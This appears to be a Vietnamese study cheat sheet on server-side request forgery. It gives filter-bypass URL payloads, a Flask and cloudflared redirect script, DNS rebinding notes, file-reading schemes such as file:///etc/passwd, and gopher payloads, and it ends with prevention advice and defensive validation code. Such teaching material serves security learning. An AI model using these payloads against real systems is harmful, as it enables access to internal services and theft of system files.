# SSRF

## Mục lục

- [Tổng quan](#tổng-quan)
- [Methodologies](#methodologies)
  - [Localhost bypass](#localhost-bypass)
  - [Domain bypass](#domain-bypass)
  - [Path Bypass](#path-bypass)
  - [Redirect](#redirect)
  - [DNS Rebinding](#dns-rebinding)
  - [Misconfigured](#misconfigured)
  - [URL scheme](#url-scheme)
    - [Đọc file](#đọc-file)
    - [Services](#services)
    - [Gopher](#gopher)
  - [Cloud metadata](#cloud-metadata)
  - [Blind SSRF](#blind-ssrf)
- [Prevention](#prevention)
- [References](#references)

## Tổng quan

SSRF là lỗ hổng xảy ra khi dữ liệu không tin cậy từ người dùng rơi vào hàm thực hiện chức năng gửi request. Khai thác thành công, attacker có thể gửi gói tin trên danh nghĩa của Server. Từ đó dẫn đến:

- Do thám, truy cập hoặc thao túng  các dịch vụ nội bộ
- Sử dụng các protocol nguy hiểm để đọc file, ...
- Lấy dữ liệu nhạy cảm từ cloud

## Methodologies

### Localhost bypass

```
http://localhost
http://127.0.0.1	
http://127.000000000000000.1
http://127.1
http://127.0.1

# Wildcard/unspecified
http://0
http://0.0.0.0

# IPv6
http://[::]
http://[0000::1]

# IPv6/IPv4 Adress Embedding
http://[0:0:0:0:0:ffff:127.0.0.1]	

# Decimal bypass
http://2130706433

# Octal bypass
http://0177.0000.0000.0001	
http://00000177.00000000.00000000.00000001	
http://017700000001	

# Hexadecimal bypass
http://0x7f000001	
http://0x7f.0x00.0x00.0x01	
http://0x0000007f.0x00000000.0x00000000.0x00000001	

# DNS to localhost
http://localtest.me	
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
http://fbi.com

# Một số ngôn ngữ/framework mặc định hỗ trợ Unicode trong regex, ví dụ .NET, Python
http://①②⑦.⓪.⓪.⓪
http://127。0。0。1
```

Unicode
```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

Auto gen wordlist
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- https://github.com/e1abrador/Burp-Encode-IP

### Domain bypass

```
# Embeding credentials in URL
https://<username>:<password>@example.com

# Fragment
https://example.com#hihi

# Query String
https://example.com?hihi

# DNS naming hierarchy
https://expected-host.target-host

# Domain confusion
https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html#domain-confusion
```

### Path Bypass

```
http://localhost/flag?123
http://localhost/flag#123
http://localhost/xyz/../flag
http://localhost/flag;123
```

### Redirect

Nếu chức năng gửi request có hỗ trợ redirect response ta có thể bypass filter bằng cách host một trang web bình thường sau đó thực hiện redirect trang web về target hoặc protocol mà ta mong muốn.

Đoạn mã tạo redirect đơn giản bằng cách dùng `cloudflared tunnel`

```python
from flask import Flask, redirect
import subprocess
import argparse
import threading
import re, sys, shutil, time

parse = argparse.ArgumentParser(
    prog="Redirect Tool",
    description="Simple tool for redirect with cloudflared tunnel"
)
parse.add_argument("-s", "--status", default=302, type=int, help="Choose status code")
parse.add_argument("--target", required=True, help="Target that you want redirect to")
args = parse.parse_args()

app = Flask(__name__)

@app.route("/")
def index():
    return redirect(args.target, code=args.status)

def run_flask():
    app.run(host="127.0.0.1", port=5000, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(1)

    if shutil.which("cloudflared") is None:
        print("Error: cloudflared chưa được cài hoặc không có trong PATH")
        sys.exit(1)

    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    tunnel_url = None

    for line in proc.stdout:
        print(line, end="")

        match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
        if match:
            tunnel_url = match.group(0)
            print(f"\nTunnel URL: {tunnel_url}")
            break

    proc.wait()
```
Cách dùng:

```bash
python3 redirect.py --target http://example.com --status 301

#output
...
Tunnel URL: https://gone-clearance-popular-diploma.trycloudflare.com
```

```bash
curl -v https://gone-clearance-popular-diploma.trycloudflare.com

#output
...
HTTP/2 301 
< date: Fri, 01 May 2026 02:28:26 GMT
< content-type: text/html; charset=utf-8
< location: http://example.com
< cf-ray: 9f4b5a4e3f505dfa-HKG
< cf-cache-status: DYNAMIC
< server: cloudflare
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://example.com">http://example.com</a>. If not, click the link.
* Connection #0 to host gone-clearance-popular-diploma.trycloudflare.com left intact
```

### DNS Rebinding

DNS Rebinding là kỹ thuật tận dụng việc thay đổi kết quả truy vấn của DNS và thường được dùng để vượt qua lớp filter thiếu sót trong SSRF hoặc được dùng để bypass CORS.

Cách mà kỹ thuật này hoạt động dựa cơ chế của DNS Resolution.
> [DNS Resolution] là quá trình phân giải domain thành địa chỉ IP tương ứng để client có thể kết nối tới server đích.

- Khi client cần truy cập một domain, nó sẽ gửi yêu cầu phân giải tên miền.
- Trước tiên, hệ thống sẽ kiểm tra cache cục bộ. Nếu đã có kết quả và TTL chưa hết hạn thì IP sẽ được trả về ngay.
- Nếu không có trong cache, client sẽ gửi truy vấn tới `DNS resolver`.
- `DNS resolver` tiếp tục kiểm tra cache của nó. Nếu đã có bản ghi hợp lệ thì trả kết quả về cho client.
- Nếu vẫn chưa có kết quả, resolver sẽ lần lượt hỏi `root nameserver` để biết nameserver quản lý phần đuôi domain đó, ví dụ `.com`.
- Sau đó resolver hỏi `TLD nameserver` để biết `authoritative nameserver` của domain cần tìm.
- Tiếp theo resolver hỏi `authoritative nameserver`, đây là nơi lưu bản ghi DNS thực tế của domain.
- `Authoritative nameserver` có thể trả về bản ghi IP trực tiếp như `A (IPv4) / AAAA (IPv6)`, hoặc trả về `CNAME` trỏ sang một domain khác.
- Nếu nhận được `CNAME`, resolver sẽ tiếp tục phân giải domain mà `CNAME` trỏ tới cho tới khi lấy được bản ghi IP cuối cùng.
- Sau đó resolver lưu kết quả vào cache theo TTL và trả IP cuối cùng về cho client.
- Client sử dụng IP đó để kết nối tới server đích.

Như vậy nếu attacker kiểm soát một domain và DNS Server của domain đó. Attacker có thể thao túng bằng cách trả về IP thông thường ở lần đầu tiên với TTL rất ngắn để tránh bị cache. Sau đó, ở lần DNS Resolution thứ 2 sẽ trả về IP khác, chẳng hạn IP nội bộ -> DNS Rebinding. 

Tool: http://1u.ms/

Code demo lỗ hổng: https://github.com/son-ops/My-Labs/tree/main/SSRF/DNS-Rebinding

Code demo solve: https://github.com/son-ops/My-Labs/blob/main/SSRF/DNS-Rebinding/solve.py

### Misconfigured

https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html#misconfigured-proxies-to-ssrf

### URL scheme

#### Đọc file

`file:///etc/passwd`
`php://filter/read/resource=/etc/passwd`

#### Services

`SFTP://`, `TFTP://`, `SMTP://`

#### Gopher

`gopher://` là một URL scheme cũ nhưng nguy rất hiểm trong SSRF vì nó cho phép attacker tự dựng dữ liệu gửi qua TCP tới `host/port` nội bộ. Nhờ đó, SSRF không chỉ gọi được HTTP endpoint mà còn có thể tương tác với các service nội bộ như `Redis`, `Memcached`, `SMTP` hay `FastCGI`,...

Cú pháp: `gopher://host:port/<type><selector>` -> `gopher://host:port/_payload`

Trong đó:

```
gopher://host:port = mở TCP connection tới host:port
_ = trong SSRF ta không quan tâm đến <type> nên sẽ lấy _ làm type giả
payload  = dữ liệu muốn gửi qua kết nối đó
```

Ví dụ với HTTP:
```
http://127.0.0.1:8000/admin
```
Client tự tạo request kiểu:
```http
GET /admin HTTP/1.1
Host: 127.0.0.1:8000
...
```
Với gopher:
```bash
gopher://127.0.0.1:8000/_GET%20/admin%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
```

Schema này được hỗ trợ mặc định trong curl

```bash
curl gopher://example.com:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20example.com%0D%0A%0D%0A

#output
HTTP/1.1 200 OK
Date: Thu, 07 May 2026 06:48:14 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
...
```
Để tạo payload cho 1 số service như `mongodb`, `mysql`, `redis`, ... tự động ta có thể sử dụng https://github.com/tarunkant/Gopherus/

Code demo Gopher với MySQL: https://github.com/son-ops/My-Labs/tree/main/SSRF/Gopher-MySQL

Code demo solve: https://github.com/son-ops/My-Labs/blob/main/SSRF/Gopher-MySQL/solve.py

### Cloud metadata

https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html

### Blind SSRF

https://github.com/assetnote/blind-ssrf-chains

### Prevention

- Chỉ cho phép request tới các domain hoặc host nằm trong `allowlist` nếu ứng dụng không thực sự cần nhận URL tùy ý từ người dùng.
- `Whitelist schema`, chỉ cho phép các schema an toàn như `http`, `https`
- Chỉ cho port `80/443` nếu không có lý do đặc biệt
- Không tự động follow `redirect`. Nếu bắt buộc phải hỗ trợ thì phải kiểm tra lại URL đích sau mỗi lần chuyển hướng
- Parse và chuẩn hóa URL bằng thư viện chuẩn trước khi kiểm tra để tránh bypass do encoding hoặc các cách biểu diễn URL/IP bất thường.
- `Resolve DNS`, kiểm tra `tất cả` bản ghi `A/AAAA`, chặn IP `nội bộ/nhạy cảm`, và phòng DNS rebinding bằng cách xác minh lại IP tại thời điểm kết nối.
- Chặn các metadata endpoint của cloud như `169.254.169.254`, nếu dùng AWS nên bật `IMDSv2-only`

Mẫu code trong trường hợp không thể sử dụng allowlist:
```python
import ipaddress, dns.resolver
from urllib.parse import urlparse
import socket, ssl, http.client

resolver = dns.resolver.Resolver()
resolver.nameservers = ["1.1.1.1"]

class PinnedHTTPConnection(http.client.HTTPConnection):
    def __init__(self, host, ip, port, timeout=5):
        super().__init__(host, port=port, timeout=timeout)
        self._ip = ip
    def connect(self):
        self.sock = socket.create_connection((self._ip, self.port), self.timeout)

class PinnedHTTPSConnection(http.client.HTTPSConnection):
    def __init__(self, host, ip, port, timeout=5):
        super().__init__(host, port=port, timeout=timeout, context=ssl.create_default_context())
        self._ip = ip
    def connect(self):
        raw = socket.create_connection((self._ip, self.port), self.timeout)
        self.sock = self._context.wrap_socket(raw, server_hostname=self.host)

def validate(url):
    try:
        u = urlparse(url)
        if u.scheme not in ("http", "https") or not u.hostname:
            return None
        if u.username or u.password:
            return None
        port = u.port or (443 if u.scheme == "https" else 80)
        if port not in (80, 443):
            return None
        ips = []
        for rrtype in ("A", "AAAA"):
            try:
                ips += [r.to_text().strip() for r in resolver.resolve(u.hostname, rrtype)]
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                pass
        if not ips or not all(ipaddress.ip_address(ip).is_global for ip in ips):
            return None
        return u, port, ips[0]
    except Exception:
        return None

def fetch(url, timeout=5):
    checked = validate(url)
    if not checked:
        return None
    u, port, ip = checked
    Conn = PinnedHTTPSConnection if u.scheme == "https" else PinnedHTTPConnection
    conn = Conn(u.hostname, ip, port, timeout=timeout)
    try:
        path = (u.path or "/") + (f"?{u.query}" if u.query else "")
        conn.request("GET", path, headers={"Host": u.netloc or u.hostname})
        r = conn.getresponse()
        return r.status, r.read()
    finally:
        conn.close()
```
### References

- https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html
- https://portswigger.net/web-security/ssrf